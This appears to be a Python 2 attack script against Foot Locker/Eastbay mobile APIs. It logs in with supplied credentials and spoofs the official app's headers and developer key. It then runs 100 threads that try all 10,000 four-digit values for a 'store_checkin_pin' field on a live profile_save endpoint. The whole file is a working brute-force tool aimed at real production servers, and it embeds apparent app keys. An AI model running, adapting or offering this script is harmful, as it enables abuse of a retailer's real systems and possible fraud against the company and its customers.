import requests
import json
import threading
import hashlib


class brute:
    def __init__(self, username, password):
        self.loggedIn = False
        self.authkey = None
        self.jwt = None
        self.custId = None
        self.user_id = None
        self.session_id = None
        self.user_pwd = None
        self.session = requests.session()
        self.session.headers = {
            'Host': 'pciis02.eastbay.com',
            'Content-Type': 'application/json',
            'X-NewRelic-ID': 'VQMOWFZQGwsGVFBbBgI=',
            'Connection': 'keep-alive',
            'Accept': 'application/json',
            'Accept-Language': 'en-gb',
            'Accept-Encoding': 'gzip, deflate',
            'User-Agent': 'footlocker/2064 CFNetwork/808.2.16 Darwin/16.3.0'}
        self.username = username
        # password needs to be sent as md5
        m = hashlib.md5()
        m.update(password)
        self.password = m.hexdigest()
        if self.login():
            self.loggedIn = True

    def login(self):
        endpoint = 'https://pciis02.eastbay.com/API/v3/Customers/WebAccount/Authenticate/'
        payload = {
            "email": self.username,
            "password": self.password,
            "needsAuthKey": "true",
            "companyId": "21",
            "vipStoreNumber": "25273"}
        r = self.session.post(endpoint, data=json.dumps(payload))
        if r.status_code == 200:
            print 'Login success'
        else:
            print 'Login error'
            return False
        self.authkey = r.json()['authKey']
        self.jwt = r.json()['JWT']
        self.custId = r.json()['webCustomerId']
        payload = [
            {"dev_key": "wRcbEq7gD46s43QL1pPMt3HC", "app_version": "2.6.1", "longitude": "", "clienttype_id": 239,
             "latitude": "", "sdk_version": "3.0", "release_id": 2503, "subpacket_type": 1, "dev_name": "Foot Locker",
             "locationServices": "ON", "beacon_optin": "YES", "vip_status": "Regular VIP", "platform_id": 9,
             "device_id": "", "refsrc": "", "os_version": "10.2", "packet_type": 9, "notification_optin": "YES"},
            {"request_type": "register", "zipcode": "", "email": self.custId}]
        payload = json.dumps(payload)
        self.session.headers['Host'] = 'footlocker.gpshopper.com'
        r = self.session.post('https://footlocker.gpshopper.com/mobile/239/9/2503/register', data=payload)
        if r.status_code == 200:
            print 'Register success'
        else:
            print 'Register error'
            return False
        self.user_id = r.json()[0]['user_id']
        self.session_id = r.json()[0]['session_id']
        self.user_pwd = r.json()[0]['password']
        return True

    def bruteForce(self):
        print 'Starting bruteforce'
        keys = []
        threads = []
        for a in range(0, 10):
            for b in range(0, 10):
                for c in range(0, 10):
                    for d in range(0, 10):
                        keys.append(int("%s" % a + "%s" % b + "%s" % c + "%s" % d))
        chunks = [keys[x:x + 100] for x in xrange(0, len(keys), 100)]
        for chunk in chunks:
            t = threading.Thread(target=self.go, args=[chunk])
            threads.append(t)
        for t in threads:
            t.start()

    def test(self, lst):
        if not self.loggedIn:
            print 'Not authenticated'
            return
        key = lst[0]
        payload = [
            {"dev_key": "wRcbEq7gD46s43QL1pPMt3HC", "app_version": "2.6.1", "longitude": "", "clienttype_id": 239,
             "latitude": "", "sdk_version": "3.0", "release_id": 2503, "subpacket_type": 1, "dev_name": "Foot Locker",
             "locationServices": "ON", "beacon_optin": "YES", "vip_status": "Regular VIP", "platform_id": 9,
             "device_id": "", "refsrc": "", "os_version": "10.2", "packet_type": 9, "notification_optin": "YES"},
            {"request_type": "profile_save",
             "supplemental_data": {"vip_status": "Regular VIP", "store_checkin_pin": str(key)}}]
        payload = json.dumps(payload)
        r = self.session.post('https://footlocker.gpshopper.com/mobile/239/9/2503/profile_save', data=payload)
        print r.json()
        print r.status_code

    def go(self, lst):
        if not self.loggedIn:
            print 'Not authenticated'
            return
        for key in lst:
            payload = [
                {"dev_key": "wRcbEq7gD46s43QL1pPMt3HC", "app_version": "2.6.1", "longitude": "", "clienttype_id": 239,
                 "latitude": "", "sdk_version": "3.0", "release_id": 2503, "subpacket_type": 1,
                 "dev_name": "Foot Locker", "locationServices": "ON", "beacon_optin": "YES",
                 "vip_status": "Regular VIP", "platform_id": 9, "device_id": "", "refsrc": "", "os_version": "10.2",
                 "packet_type": 9, "notification_optin": "YES"}, {"request_type": "profile_save",
                                                                  "supplemental_data": {"vip_status": "Regular VIP",
                                                                                        "store_checkin_pin": str(key)}}]
            payload = json.dumps(payload)
            r = self.session.post('https://footlocker.gpshopper.com/mobile/239/9/2503/profile_save', data=payload)
            if not r.status_code == 200:
                print r.text
                print str(key) + ' failed [%s' % r.status_code + ']'
        print 'Thread: Done'


username = raw_input("Email: ")
password = raw_input("Password: ")
b = brute(username, password)
b.bruteForce()

